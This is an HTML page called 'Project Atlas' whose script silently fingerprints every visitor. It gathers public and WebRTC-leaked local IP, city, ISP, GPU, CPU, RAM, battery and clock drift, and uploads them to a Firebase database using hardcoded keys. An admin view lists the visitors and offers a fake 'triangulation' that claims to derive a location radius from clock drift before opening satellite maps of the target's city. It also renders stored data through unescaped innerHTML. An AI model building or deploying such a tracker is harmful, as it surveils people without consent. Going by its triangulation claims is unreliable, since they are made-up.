<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>ErrahWorld | Project Atlas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
        
        :root {
            --bg-main: #05070a; --bg-secondary: #0a0f1a; --bg-panel: rgba(10, 15, 26, 0.9);
            --accent: #6366f1; --accent-dim: rgba(99, 102, 241, 0.2);
            --text-main: #f8fafc; --text-dim: #94a3b8; --border: rgba(255, 255, 255, 0.1);
            --danger: #ef4444; --success: #22c55e;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-main); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
        .container { width: 100%; max-width: 1000px; }
        h1 { font-size: clamp(2.5rem, 10vw, 4rem); text-align: center; font-weight: 900; margin-bottom: 30px; letter-spacing: -2px; }
        .panel { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 24px; padding: 30px; margin-bottom: 30px; backdrop-filter: blur(20px); text-align: center; }
        
        /* Data Table Styles */
        .table-container { overflow-x: auto; border-radius: 18px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); }
        table { width: 100%; border-collapse: collapse; }
        th { color: var(--accent); padding: 15px; font-size: 0.7rem; text-transform: uppercase; font-family: 'JetBrains Mono'; border-bottom: 1px solid var(--border); }
        td { padding: 15px; text-align: center; color: var(--text-dim); font-size: 0.85rem; border-bottom: 1px solid rgba(255,255,255,0.03); }

        #trafficSection { margin-top: 50px; display: none; width: 100%; }
        
        /* Specialized Buttons */
        .btn-tri { background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent); padding: 4px 8px; border-radius: 6px; font-size: 10px; cursor: pointer; font-family: 'JetBrains Mono'; margin-top: 5px; transition: 0.2s; }
        .btn-tri:hover { background: var(--accent); color: white; }
        .btn-inspect { color: var(--text-main); background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 4px 8px; border-radius: 6px; font-size: 10px; cursor: pointer; }
        .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; padding: 4px 8px; border-radius: 5px; cursor: pointer; }

        /* Triangulation Radar Overlay */
        #triOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 3000; flex-direction: column; align-items: center; justify-content: center; }
        .radar-circle { width: 180px; height: 180px; border: 2px solid var(--accent); border-radius: 50%; position: relative; margin-bottom: 20px; box-shadow: 0 0 30px var(--accent-dim); }
        .radar-circle::before { content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--accent); transform-origin: left; animation: scan 2s linear infinite; }
        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; }
    </style>
</head>
<body>

    <div class="container">
        <h1 id="title">Project Atlas</h1>
        <div id="desc" class="panel">System Online. Tracking active.</div>

        <div id="trafficSection">
            <h2 style="font-family: 'JetBrains Mono'; color: var(--accent); font-size: 0.9rem; margin-bottom: 15px;">NETWORK TERMINALS</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Signal Time</th>
                            <th>Node Identity</th>
                            <th>Diagnostics</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody id="trafficBody" style="font-family: 'JetBrains Mono';"></tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="triOverlay">
        <div class="radar-circle"></div>
        <div id="triStatus" style="font-family: 'JetBrains Mono'; color: var(--accent); text-align: center;">UPLINKING TO SATELLITE...</div>
    </div>

    <button id="adminToggle">Admin Access</button>

    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

    <script>
        // Firebase Configuration (Using your credentials)
        const firebaseConfig = {
            apiKey: "AIzaSyBoePuKarSCVgvxQQBGvkMKq16DvKmBYBE",
            authDomain: "strenght-a9f37.firebaseapp.com",
            databaseURL: "https://strenght-a9f37-default-rtdb.firebaseio.com",
            projectId: "strenght-a9f37"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const auth = firebase.auth();

        // 1. Passive Diagnostic Tracking
        async function runDiagnostics() {
            try {
                const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
                const data = await res.json();
                const snapshot = await db.ref("visits").orderByChild("ip").equalTo(data.ip).once("value");
                
                if (!snapshot.exists()) {
                    const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                    const driftData = await driftRes.json();
                    const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
                    
                    let bat = "N/A";
                    if(navigator.getBattery) {
                        const b = await navigator.getBattery();
                        bat = `${Math.round(b.level * 100)}%`;
                    }

                    let localIP = "Secure";
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if (e && e.candidate) {
                            const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (m) localIP = m[1];
                        }
                    };

                    setTimeout(() => {
                        db.ref("visits").push({
                            ip: data.ip, local_ip: localIP, city: data.city, isp: data.isp,
                            cpu: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
                            gpu: getGPU(), res: `${screen.width}x${screen.height}`,
                            battery: bat, drift: clockDrift + "ms", ts: Date.now(),
                            time: new Date().toLocaleTimeString()
                        });
                    }, 1000);
                }
            } catch (e) {}
        }
        function getGPU() {
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split('/').pop();
            } catch(e) { return "N/A"; }
        }
        runDiagnostics();

        // 2. Admin Logic
        auth.onAuthStateChanged(user => {
            if (user && user.uid === 'Td0yoO3ygYZxbeMZjYtFAj9etA22') {
                document.getElementById("trafficSection").style.display = "block";
                loadLogs();
            }
        });

        function loadLogs() {
            db.ref("visits").orderByChild("ts").on("value", snap => {
                const tBody = document.getElementById("trafficBody");
                tBody.innerHTML = "";
                snap.forEach(child => {
                    const d = child.val();
                    const tr = document.createElement("tr");
                    tr.innerHTML = `
                        <td>${d.time}</td>
                        <td style="text-align:left;">
                            <b style="color:var(--text-main)">${d.ip}</b><br>
                            <span style="font-size:10px;">LOC: ${d.local_ip}</span><br>
                            <button class="btn-tri" onclick="triangulate('${child.key}')">TRIANGULATE</button>
                        </td>
                        <td>
                            <button class="btn-inspect" onclick="inspect('${child.key}')">SPECS</button>
                        </td>
                        <td><button class="del-log" onclick="db.ref('visits/${child.key}').remove()">DEL</button></td>
                    `;
                    tBody.prepend(tr);
                });
            });
        }

        // 3. Separate Functions for Specs vs Triangulation
        async function inspect(key) {
            const d = (await db.ref("visits/" + key).once("value")).val();
            alert(`HARDWARE SPECS:\n----------------\nGPU: ${d.gpu}\nCPU: ${d.cpu} Cores\nRAM: ${d.ram}GB\nRES: ${d.res}\nBATTERY: ${d.battery}\nDRIFT: ${d.drift}`);
        }

        async function triangulate(key) {
            const d = (await db.ref("visits/" + key).once("value")).val();
            const overlay = document.getElementById('triOverlay');
            overlay.style.display = 'flex';
            
            setTimeout(() => {
                document.getElementById('triStatus').innerHTML = "LATENCY MATCHED.<br>TRIANGULATING NODE...";
                setTimeout(() => {
                    overlay.style.display = 'none';
                    if(confirm(`TRIANGULATION COMPLETE\nRadius: ${(parseInt(d.drift)*0.4).toFixed(1)}km\nTarget: ${d.city}\n\nOpen Satellite OSINT?`)) {
                        window.open(`https://www.google.com/maps/search/${d.city}+${d.isp}/@?api=1&maptype=satellite`, '_blank');
                    }
                }, 1500);
            }, 1500);
        }

        document.getElementById('adminToggle').onclick = () => {
            const email = prompt("Admin ID:");
            const pass = prompt("Keyphrase:");
            auth.signInWithEmailAndPassword(email, pass);
        };
    </script>
</body>
</html>
